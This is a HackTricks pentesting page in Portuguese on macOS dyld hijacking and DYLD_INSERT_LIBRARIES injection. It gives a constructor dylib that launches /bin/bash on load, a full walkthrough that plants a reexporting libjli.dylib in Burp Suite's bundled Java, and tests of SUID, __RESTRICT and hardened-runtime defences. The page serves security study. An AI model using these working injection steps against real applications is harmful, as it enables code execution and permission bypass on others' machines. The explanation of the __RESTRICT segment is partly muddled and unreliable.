# macOS Dyld Hijacking & DYLD\_INSERT\_LIBRARIES

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Você trabalha em uma **empresa de segurança cibernética**? Você quer ver sua **empresa anunciada no HackTricks**? ou você quer ter acesso à **última versão do PEASS ou baixar o HackTricks em PDF**? Verifique os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
* **Junte-se ao** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe seus truques de hacking enviando PRs para o** [**repositório hacktricks**](https://github.com/carlospolop/hacktricks) **e** [**repositório hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## Exemplo básico DYLD\_INSERT\_LIBRARIES

**Biblioteca para injetar** para executar um shell:
```c
// gcc -dynamiclib -o inject.dylib inject.c

#include <syslog.h>
#include <stdio.h>
#include <unistd.h>
__attribute__((constructor))

void myconstructor(int argc, const char **argv)
{
syslog(LOG_ERR, "[+] dylib injected in %s\n", argv[0]);
printf("[+] dylib injected in %s\n", argv[0]);
execv("/bin/bash", 0);
}
```
Binário para atacar:
```c
// gcc hello.c -o hello
#include <stdio.h>

int main()
{
printf("Hello, World!\n");
return 0;
}
```
Injeção:
```bash
DYLD_INSERT_LIBRARIES=inject.dylib ./hello
```
## Exemplo de Hijacking do Dyld

O binário vulnerável alvo é `/Applications/Burp Suite Professional.app/Contents/Resources/jre.bundle/Contents/Home/bin/java`.

{% tabs %}
{% tab title="LC_RPATH" %}
{% code overflow="wrap" %}
```bash
# Check where are the @rpath locations
otool -l "/Applications/Burp Suite Professional.app/Contents/Resources/jre.bundle/Contents/Home/bin/java" | grep LC_RPATH -A 2
cmd LC_RPATH
cmdsize 32
path @loader_path/. (offset 12)
--
cmd LC_RPATH
cmdsize 32
path @loader_path/../lib (offset 12)
```
{% endcode %}
{% endtab %}

{% tab title="@rpath" %}
{% code overflow="wrap" %}
```bash
# Check librareis loaded using @rapth and the used versions
otool -l "/Applications/Burp Suite Professional.app/Contents/Resources/jre.bundle/Contents/Home/bin/java" | grep "@rpath" -A 3
name @rpath/libjli.dylib (offset 24)
time stamp 2 Thu Jan  1 01:00:02 1970
current version 1.0.0
compatibility version 1.0.0
```
{% endcode %}
{% endtab %}

{% tab title="entitlements" %}
<pre class="language-bash" data-overflow="wrap"><code class="lang-bash">codesign -dv --entitlements :- "/Applications/Burp Suite Professional.app/Contents/Resources/jre.bundle/Contents/Home/bin/java"
<strong>[...]com.apple.security.cs.disable-library-validation[...]
</strong></code></pre>
{% endtab %}
{% endtabs %}

Com as informações anteriores, sabemos que **não está verificando a assinatura das bibliotecas carregadas** e está **tentando carregar uma biblioteca de**:

* `/Applications/Burp Suite Professional.app/Contents/Resources/jre.bundle/Contents/Home/bin/libjli.dylib`
* `/Applications/Burp Suite Professional.app/Contents/Resources/jre.bundle/Contents/Home/bin/libjli.dylib`

No entanto, o primeiro não existe:
```bash
pwd
/Applications/Burp Suite Professional.app

find ./ -name libjli.dylib
./Contents/Resources/jre.bundle/Contents/Home/lib/libjli.dylib
./Contents/Resources/jre.bundle/Contents/MacOS/libjli.dylib
```
Então, é possível sequestrá-lo! Crie uma biblioteca que **execute algum código arbitrário e exporte as mesmas funcionalidades** da biblioteca legítima, reexportando-a. E lembre-se de compilá-la com as versões esperadas:

{% code title="libjli.m" %}
```objectivec
#import <Foundation/Foundation.h>

__attribute__((constructor))
void custom(int argc, const char **argv) {
NSLog(@"[+] dylib hijacked in %s",argv[0]);
}
```
{% endcode %}

Compile-o:

{% code overflow="wrap" %}
```bash
gcc -dynamiclib -current_version 1.0 -compatibility_version 1.0 -framework Foundation libjli.m -Wl,-reexport_library,"/Applications/Burp Suite Professional.app/Contents/Resources/jre.bundle/Contents/Home/lib/libjli.dylib" -o libjli.dylib
# Note the versions and the reexport
```
{% endcode %}

O caminho de reexportação criado na biblioteca é relativo ao carregador, vamos alterá-lo para um caminho absoluto para a biblioteca a ser exportada:

{% code overflow="wrap" %}
```bash
#Check relative
otool -l libjli.dylib| grep REEXPORT -A 2
cmd LC_REEXPORT_DYLIB
cmdsize 48
name @rpath/libjli.dylib (offset 24)

#Change to absolute to the location of the library
install_name_tool -change @rpath/libjli.dylib "/Applications/Burp Suite Professional.app/Contents/Resources/jre.bundle/Contents/Home/lib/libjli.dylib" libjli.dylib

# Check again
otool -l libjli.dylib| grep REEXPORT -A 2
cmd LC_REEXPORT_DYLIB
cmdsize 128
name /Applications/Burp Suite Professional.app/Contents/Resources/jre.bundle/Contents/Home/lib/libjli.dylib (offset 24)
```
{% endcode %}

Finalmente, copie-o para o **local sequestrado**:

{% code overflow="wrap" %}
```bash
cp libjli.dylib "/Applications/Burp Suite Professional.app/Contents/Resources/jre.bundle/Contents/Home/bin/libjli.dylib"
```
{% endcode %}

E **execute** o binário e verifique se a **biblioteca foi carregada**:

<pre class="language-context"><code class="lang-context">./java
<strong>2023-05-15 15:20:36.677 java[78809:21797902] [+] dylib hijacked in ./java
</strong>Usage: java [options] &#x3C;mainclass> [args...]
(para executar uma classe)
</code></pre>

{% hint style="info" %}
Um bom artigo sobre como explorar essa vulnerabilidade para abusar das permissões da câmera do Telegram pode ser encontrado em [https://danrevah.github.io/2023/05/15/CVE-2023-26818-Bypass-TCC-with-Telegram/](https://danrevah.github.io/2023/05/15/CVE-2023-26818-Bypass-TCC-with-Telegram/)
{% endhint %}

## Escala Maior

Se você planeja tentar injetar bibliotecas em binários inesperados, você pode verificar as mensagens de evento para descobrir quando a biblioteca é carregada dentro de um processo (neste caso, remova o printf e a execução `/bin/bash`).
```bash
sudo log stream --style syslog --predicate 'eventMessage CONTAINS[c] "[+] dylib"'
```
## Verificar restrições

### SUID e SGID
```bash
# Make it owned by root and suid
sudo chown root hello
sudo chmod +s hello
# Insert the library
DYLD_INSERT_LIBRARIES=inject.dylib ./hello

# Remove suid
sudo chmod -s hello
```
### Seção `__RESTRICT` com segmento `__restrict`

A seção `__RESTRICT` é um recurso de segurança no macOS que permite restringir o carregamento de bibliotecas dinâmicas em um processo. Isso é alcançado usando o segmento `__restrict` no arquivo executável.

Quando o segmento `__restrict` está presente, o carregador dinâmico do macOS, conhecido como `dyld`, verifica se as bibliotecas dinâmicas especificadas no segmento `__RESTRICT` estão presentes no sistema antes de carregá-las. Se uma biblioteca não estiver presente, o `dyld` não a carregará, evitando assim possíveis ataques de hijacking.

O segmento `__restrict` é uma medida de segurança eficaz para evitar a execução de código malicioso em um processo, pois impede que bibliotecas não confiáveis sejam carregadas. No entanto, é importante observar que essa técnica não é uma solução completa para todos os possíveis ataques de escalonamento de privilégios.

Para utilizar o segmento `__restrict`, é necessário compilar o código-fonte com a flag `-segprot __RESTRICT rwx rwx` para garantir que o segmento seja protegido contra escrita e execução. Isso impede que um atacante modifique o segmento `__restrict` para contornar as restrições de carregamento de bibliotecas.

Em resumo, a seção `__RESTRICT` com o segmento `__restrict` é uma técnica de endurecimento do macOS que ajuda a prevenir ataques de hijacking de bibliotecas dinâmicas, restringindo o carregamento de bibliotecas não confiáveis em um processo.
```bash
gcc -sectcreate __RESTRICT __restrict /dev/null hello.c -o hello-restrict
DYLD_INSERT_LIBRARIES=inject.dylib ./hello-restrict
```
### Runtime reforçado

Crie um novo certificado no Keychain e use-o para assinar o binário:

{% code overflow="wrap" %}
```bash
# Apply runtime proetction
codesign -s <cert-name> --option=runtime ./hello
DYLD_INSERT_LIBRARIES=inject.dylib ./hello #Library won't be injected

# Apply library validation
codesign -f -s <cert-name> --option=library ./hello
DYLD_INSERT_LIBRARIES=inject.dylib ./hello-signed #Will throw an error because signature of binary and library aren't signed by same cert (signs must be from a valid Apple-signed developer certificate)

# Sign it
## If the signature is from an unverified developer the injection will still work
## If it's from a verified developer, it won't
codesign -f -s <cert-name> inject.dylib
DYLD_INSERT_LIBRARIES=inject.dylib ./hello-signed

# Apply CS_RESTRICT protection
codesign -f -s <cert-name> --option=restrict hello-signed
DYLD_INSERT_LIBRARIES=inject.dylib ./hello-signed # Won't work
```
{% endcode %}

{% hint style="danger" %}
Observe que mesmo que existam binários assinados com as flags **`0x0(none)`**, eles podem obter a flag **`CS_RESTRICT`** dinamicamente quando executados e, portanto, essa técnica não funcionará neles.

Você pode verificar se um processo possui essa flag com (obtenha [**csops aqui**](https://github.com/axelexic/CSOps)):&#x20;
```bash
csops -status <pid>
```
e então verifique se a flag 0x800 está habilitada.
{% endhint %}

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Você trabalha em uma **empresa de cibersegurança**? Você quer ver sua **empresa anunciada no HackTricks**? ou você quer ter acesso à **última versão do PEASS ou baixar o HackTricks em PDF**? Verifique os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
* **Junte-se ao** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe seus truques de hacking enviando PRs para o** [**repositório hacktricks**](https://github.com/carlospolop/hacktricks) **e** [**repositório hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
